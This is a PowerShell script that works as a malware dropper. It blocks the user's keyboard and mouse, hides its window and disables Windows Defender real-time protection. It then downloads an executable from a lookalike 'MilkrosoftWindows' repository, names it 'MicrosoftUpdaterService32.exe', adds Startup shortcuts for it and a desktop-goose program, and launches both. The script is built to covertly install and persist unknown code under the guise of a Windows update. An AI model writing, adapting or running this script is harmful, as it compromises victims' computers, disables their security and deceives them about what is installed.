Add-Type -AssemblyName presentationCore
Add-Type -AssemblyName System.Windows.Forms

$SignatureBlockInput = @"
  [DllImport("user32.dll")]
  public static extern bool BlockInput(bool fBlockIt);
"@

$UserInput = Add-Type -MemberDefinition $SignatureBlockInput -Name "UserInput" -PassThru

$SignatureShowWindowAsync = @"
  [DllImport("user32.dll")]
  public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@

$ShowWindowAsync = Add-Type -MemberDefinition $SignatureShowWindowAsync -Name "Window" -PassThru

$UserInput::BlockInput($true) | Out-Null
$ShowWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 2) | Out-Null

Set-MpPreference -DisableRealtimeMonitoring $true

mkdir C:\SystemFiles

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile('https://raw.github.com/MilkrosoftWindows/WindowsUpdate/meowfart/meow_fart.exe','C:\SystemFiles\MicrosoftUpdaterService32.exe')
$WebClient.DownloadFile('https://raw.github.com/MilkrosoftWindows/WindowsUpdate/main/WindowsUpdate.zip', $home+'\WindowsUpdate.zip')
$WebClient.DownloadFile('https://raw.github.com/SFML/SFML/master/extlibs/bin/x86/openal32.dll','C:\SystemFiles\openal32.dll')

expand-archive -path $home\WindowsUpdate.zip -destinationpath $home\WindowsApps
rm $home\WindowsUpdate.zip

$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($home+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdaterService32.lnk')
$Shortcut.TargetPath = 'C:\SystemFiles\MicrosoftUpdaterService32.exe'
$Shortcut.Save()
$Shortcut = $WshShell.CreateShortcut($home+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseDesktop.lnk')
$Shortcut.TargetPath = $home+'\WindowsApps\GooseDesktop.exe'
$Shortcut.Save()

start C:\SystemFiles\MicrosoftUpdaterService32.exe
start $home\WindowsApps\GooseDesktop.exe

$UserInput::BlockInput($false) | Out-Null
exit
